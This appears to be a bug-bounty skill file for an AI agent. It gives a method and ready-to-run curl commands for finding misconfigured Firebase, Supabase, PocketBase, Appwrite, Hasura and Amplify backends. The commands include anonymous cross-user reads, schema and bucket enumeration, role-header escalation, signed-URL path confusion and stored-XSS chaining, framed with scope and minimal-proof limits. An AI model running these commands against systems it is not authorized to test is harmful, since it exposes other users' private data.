---
name: hunt-baas
description: "Hunt Backend-as-a-Service misconfiguration — Firebase (Firestore / Realtime DB / Storage rules like allow read, write: if true, or auth != null with no ownership check, or test-mode), Supabase (Row Level Security disabled or USING(true) on API-exposed tables, the anon key treated as a secret, SECURITY DEFINER RPCs bypassing RLS, public storage buckets, predictable signed URLs), plus PocketBase / Appwrite / Nhost equivalents. The anon/publishable key is MEANT to be public — the control is the server-side rule, so an anonymous REST read of another user's data is a real finding. Use whenever a target's JS bundle or app reveals a Firebase config, a *.supabase.co URL + anon key, or any BaaS SDK."
sources: 0xray-authored
---

# HUNT-BAAS — Backend-as-a-Service misconfiguration

The browser is supposed to hold a **publishable** key. The finding is a server rule that returns or accepts data the caller should not have. Quote rows, not the key.

| Key in the bundle | By itself | Becomes a finding when |
|---|---|---|
| Firebase `apiKey`, Supabase `anon` / `eyJ…` role `anon`, Appwrite public SDK | Not a vuln | A rule lets you read/write someone else's rows, or `auth != null` is the only check and anonymous sign-in is on |
| Supabase `service_role`, Hasura `x-hasura-admin-secret`, Firebase service-account JSON, Appwrite API key with admin scope | **Is** a vuln — these bypass rules | You decode the JWT (`role` = `service_role`) or call one admin API and show a row a normal user cannot see |

## Decision tree

1. **Identify the product** from the bundle: `firebaseio.com` / `firestore.googleapis.com` / `firebasestorage`, `*.supabase.co`, `pocketbase`, `appwrite`, `hasura` / `nhost`, `aws-amplify`.
2. **Extract coordinates** (project id, URL, key, bucket, collection/table names) from JS. Names come from `collection(db,'x')`, `.from('table')`, `doc(db,'x/y')`, string literals next to the client.
3. **List the schema** if the product exposes it (PostgREST OpenAPI, PocketBase `/api/collections`). Do not guess tables forever — use names you actually saw, plus one obvious `users` / `profiles` check.
4. **Read as anonymous.** Then read as a single low-priv user if the rule is `auth != null`. Compare to a second account.
5. **Write once** only if the engagement allows it: one unique marker field, re-read it, stop. Do not mass-insert. Delete the marker if the API allows.
6. **Classify:** world-readable PII, cross-account read, open write, or admin key in the client.

`200` with `[]` or `{"documents":[]}` means the path exists and the rule did not error — it is not a data leak. `401` / `403` / `Permission denied` closes that path. A response that contains another user's email, token, or private file is the hit.

## Firebase

Config in JS: `apiKey`, `authDomain`, `projectId`, `databaseURL`, `storageBucket`.

```bash
# Firestore — world-readable collection (names from the JS, not a giant wordlist)
curl -s "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents/$COLLECTION"

# Realtime DB. A bare /.json that returns the tree is the open-.read jackpot.
curl -s "https://$DB.firebaseio.com/.json"
curl -s "https://$DB.firebaseio.com/$NODE.json?shallow=true"

# Storage object listing
curl -s "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o"

# Anonymous sign-in (ONE account) when rules are only `auth != null`
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$APIKEY" \
  -H 'Content-Type: application/json' -d '{"returnSecureToken":true}'
# Re-read Firestore/RTDB with Authorization: Bearer <idToken>

# get and list are different rules. One document id you actually saw in JS/traffic:
curl -s "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents/$COLLECTION/$DOCID"
# Collection names the JS never spelled (still not a dump):
curl -s -X POST "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents:listCollectionIds" \
  -H 'Content-Type: application/json' -d '{}'
# runQuery is a list. One foreign document, then stop — do not page the collection.
curl -s -X POST "https://firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents:runQuery" \
  -H 'Content-Type: application/json' \
  -d "{\"structuredQuery\":{\"from\":[{\"collectionId\":\"$COLLECTION\"}]}}"

# Storage download tokens appear in JS as ?alt=media&token=. Fetch **one** object you do not own.
# Do not brute the UUID. Encode path slashes as %2F. A world-listable prefix + leaked token is the finding.
curl -s -o /tmp/fbobj -w "%{http_code} %{size_download}\n" \
  "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/${PATH//\//%2F}?alt=media&token=$TOKEN"
```

`auth != null` plus working anonymous sign-in is cross-tenant read if the documents are not scoped to `request.auth.uid`. Show B's document with A's anon token. Rules that check `request.auth.uid == resource.data.uid` and actually enforce it are closed — say so after one failed cross-read.

Regional RTDB host is `$DB.firebasedatabase.app` as well as `firebaseio.com`. Try the host that appears in the config.

## Supabase

```bash
# Schema the anon key is allowed to see (tables, RPCs, views)
curl -s "https://$REF.supabase.co/rest/v1/" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H "Accept: application/openapi+json"

# Table read. Rows = RLS off or USING(true). Non-public schema:
curl -s "https://$REF.supabase.co/rest/v1/$TABLE?select=*" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H "Accept-Profile: public"

# RPC (SECURITY DEFINER runs as owner and skips RLS)
curl -s -X POST "https://$REF.supabase.co/rest/v1/rpc/$FN" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H 'Content-Type: application/json' -d '{}'

# Storage: public object URL, and list
curl -s "https://$REF.supabase.co/storage/v1/object/public/$BUCKET/"
curl -s -X POST "https://$REF.supabase.co/storage/v1/object/list/$BUCKET" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H 'Content-Type: application/json' -d '{"prefix":"","limit":10}'

# Schemas other than public. Repeat for private, storage, graphql_public,
# and any name the OpenAPI root lists. Empty OpenAPI is "not exposed", not a leak.
curl -s "https://$REF.supabase.co/rest/v1/" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" \
  -H "Accept-Profile: private" -H "Accept: application/openapi+json"

# FK embed: a parent you can read should not return another user's child rows
curl -s "https://$REF.supabase.co/rest/v1/$TABLE?select=*,profiles(*)" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON"

# Views: Postgres views default to owner rights and skip the base table's RLS.
# If OpenAPI lists a view (often *_view / *_public), GET it as anon and body-diff vs the table.
# SECURITY DEFINER RPC with a caller-controlled id is the same class — one RPC, one foreign row.

# Signed URL: do not brute tokens. If JS/email embeds a createSignedUrl for another user's object, GET it once.
# Path confusion on the signed path (../, extra prefix) only if the signature still verifies — one object you do not own.
```

Decode every JWT in the bundle. `"role":"service_role"` on the client is the bug even before you call the API — then prove it with one `select=*` the anon key is denied. GraphQL, if enabled, is `POST /graphql/v1` with the same headers. Realtime subscriptions that deliver other tenants' rows are the same bug on `wss://$REF.supabase.co/realtime/v1/websocket`.

Write probe (authorized engagements only): one `POST /rest/v1/$TABLE` with a marker column. `201` and a re-read proves open insert. Stop.

## PocketBase, Appwrite, Nhost / Hasura

| Product | First reads | Open-rule signal |
|---|---|---|
| PocketBase | `GET /api/collections` then `GET /api/collections/users/records` (older servers: `GET /api/records/users`) | Collection API rule empty / "Public" and records return |
| Appwrite | `GET /v1/databases/{db}/collections/{col}/documents` with `X-Appwrite-Project` (ids from the JS, not guessed) | `any` / guest role returns another user's documents |
| Nhost / Hasura | `POST /v1/graphql` `{"query":"{ __schema { queryType { name } } }"}`. If the client already sends `x-hasura-role`, retry one query with a higher role (`user`, then `admin`). | A row the anon role cannot read. `x-hasura-admin-secret` in the client is the bug once one forbidden query succeeds. A role header the server ignores is not a finding |

Same proof standard: another principal's row, or an admin secret that returns one.

AWS Amplify / AppSync: `aws-exports.js` or `amplifyconfiguration.json` carries `aws_appsync_graphqlEndpoint` and `aws_appsync_apiKey`. The key is supposed to be public. Send **one** query the client already issues, with header `x-api-key`. Another user's row is the finding. An empty public `__schema` is not.

## Validation

- Show the **other** account's data (redact in the write-up per `evidence-hygiene`). Your own row after you inserted it only proves a write — say which. A view that returns the same foreign row the table RLS hid is the finding — quote the view name.
- Admin/service key: paste the decoded `role` claim and one forbidden read that succeeded. Do not keep using the key.
- Open write: one marker, re-read, stop. A `201` you did not re-read is weaker but acceptable if the body echoes a server id.
- Predictable storage URLs: fetch one object you do not own (`/avatars/1.jpg`, `/uid/passport.pdf`). Listing plus a private object is High; a full PII or credential dump is Critical. "Anon key in JS" with no readable foreign data is not a finding.

## Chains

- Open `users` / `profiles` → emails and password hashes or reset tokens → stop at the proof, do not crack hashes (`hunt-ato` only if the token is directly reusable).
- `service_role` or admin secret → read storage + auth tables once → `hunt-cloud-misconfig` if cloud keys are inside the rows.
- Writable rules → one stored HTML/SVG if the bucket is served on the app origin → `hunt-xss`. Do not plant a worm.
- Collection names from a fresh bundle → `changed-js-deepdive`.

## Rails

- In-scope project only (the BaaS project the target embeds). One anon user, one marker write, no table dumps beyond the proof row.
- No password guessing against Firebase Auth or Supabase `signInWithPassword`. No hash cracking.
- Draft only — do not submit.

## Before you report — dedup gate

```bash
python3 engine/dedup.py check --program <program> --class baas --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless the table, rule, or a fix bypass is a concrete differentiator.

Cross-refs: `hunt-cloud-misconfig`, `hunt-idor`, `hunt-source-leak`, `changed-js-deepdive`, `hunt-api-misconfig`, `evidence-hygiene`, `triage-validation`.
